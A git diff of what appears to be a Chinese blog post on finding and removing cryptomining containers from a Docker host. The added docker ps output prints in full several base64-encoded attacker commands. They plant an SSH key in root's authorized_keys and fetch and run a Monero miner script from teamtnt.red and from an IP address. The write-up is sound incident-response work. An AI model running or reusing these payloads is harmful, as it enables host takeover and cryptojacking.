@@ -147,16 +147,24 @@
     <li><a href="#3找到恶意进程">3、找到恶意进程</a></li>
     <li><a href="#4找到程序目录">4、找到程序目录</a></li>
     <li><a href="#5查看进程">5、查看进程</a></li>
-    <li><a href="#6查找程序本体">6、查找程序本体</a></li>
-    <li><a href="#7查看镜像">7、查看镜像</a></li>
-    <li><a href="#7停容器">7、停容器</a>
+    <li><a href="#6查找程序本体">6、查找程序本体</a>
+      <ul>
+        <li><a href="#注">注</a></li>
+      </ul>
+    </li>
+    <li><a href="#7查看镜像">7、查看镜像</a>
+      <ul>
+        <li><a href="#注-1">注</a></li>
+      </ul>
+    </li>
+    <li><a href="#8停容器">8、停容器</a>
       <ul>
         <li></li>
       </ul>
     </li>
-    <li><a href="#8删容器">8、删容器</a></li>
-    <li><a href="#9删镜像">9、删镜像</a></li>
-    <li><a href="#10入侵原因">10、入侵原因</a></li>
+    <li><a href="#9删容器">9、删容器</a></li>
+    <li><a href="#10删镜像">10、删镜像</a></li>
+    <li><a href="#11入侵原因">11、入侵原因</a></li>
   </ul>
 </nav>
     </div>
@@ -369,16 +377,49 @@ CONTAINER ID        IMAGE                                                       
 fd3a4ea7e1d9        ubuntu                                                                <span style="color:#d14">&#34;/bin/bash /var/tmp/./crypto/.../httpd-crypto&#34;</span>   <span style="color:#099">11</span> hours ago        Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">11</span> hours ago                                                    
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="7查看镜像">7、查看镜像</h2>
+</div><p>如果command无法查看完整，可以用如下命令</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#  查看完整的command</span>
+<span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker ps --no-trunc -a</span>
+
+CONTAINER ID                                                       IMAGE                                                                     COMMAND                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 CREATED             STATUS                       PORTS                                         NAMES
+d4b3ae6385319554d7cff96aa3259fded0e7a63cdaa61d04d0cb7dbf331dabb7   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">2</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> days ago                                                      eloquent_noyce
+902e4c85e42399df5a15d745f8da91bfaa520cf77754cbbe4bda194fb93ec212   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">2</span> days ago          Up <span style="color:#099">2</span> days                                                                  intelligent_taussig
+b5d5a2638c3735cb18b4df540dd85ab17805f2086d4374c432ed7f9182f77c21   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">4</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> days ago                                                      flamboyant_liskov
+55f6154c77cf0239c0df0f15bdbe1a4b67db71f5a61f6ed55ca543af40a429d7   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">4</span> days ago          Up <span style="color:#099">4</span> days                                                                  clever_sammet
+fd3a4ea7e1d9eba40b2a1bb887fc85c798894b23b27f5cc306130cc22c6cf6db   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">2</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> weeks ago                                                     vigilant_lamport
+2079058fc554083300ef6277d1942404bf1318ec057d63a7af81504564e9f5d3   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">4</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> weeks ago                                                     funny_swirles
+b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">7</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">7</span> weeks ago                                                     kind_leakey
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="注">注</h3>
+<p>一般根据完整的 command 可以看到挖矿病毒执行的脚本或者命令</p>
+<h2 id="7查看镜像">7、查看镜像</h2>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker images |grep docker72590</span>
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker images | grep alpine</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="7停容器">7、停容器</h2>
+</div><h3 id="注-1">注</h3>
+<p>一般情况下，挖矿的容器类型与该镜像添加的时间也接近，镜像类型也是一样的</p>
+<h2 id="8停容器">8、停容器</h2>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -391,7 +432,7 @@ fd3a4ea7e1d9        ubuntu                                                      
 </div>
 </div><h4 id="注意">注意：</h4>
 <p>要找到守护进程和主体进程，清理干净</p>
-<h2 id="8删容器">8、删容器</h2>
+<h2 id="9删容器">9、删容器</h2>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -402,7 +443,7 @@ fd3a4ea7e1d9        ubuntu                                                      
 <span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rm d241358140a8</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="9删镜像">9、删镜像</h2>
+</div><h2 id="10删镜像">10、删镜像</h2>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -411,7 +452,7 @@ fd3a4ea7e1d9        ubuntu                                                      
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rmi b39e0b392b7e</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="10入侵原因">10、入侵原因</h2>
+</div><h2 id="11入侵原因">11、入侵原因</h2>
 <p>容器的入侵途径没 ECS 方便定位，等后续学会了再补充。。。<br>
 不过清理容器挖矿比 ECS 还方便，查看了下 ECS 日志，只能看到部分 messages 里面存在日志，其他找不到蛛丝马迹了<br>
 不过可以把测试服务器的开源软件版本搜集下，搜查下 CVE 库看看是否有漏洞，如果有漏洞的话可以升级下安全版本</p>
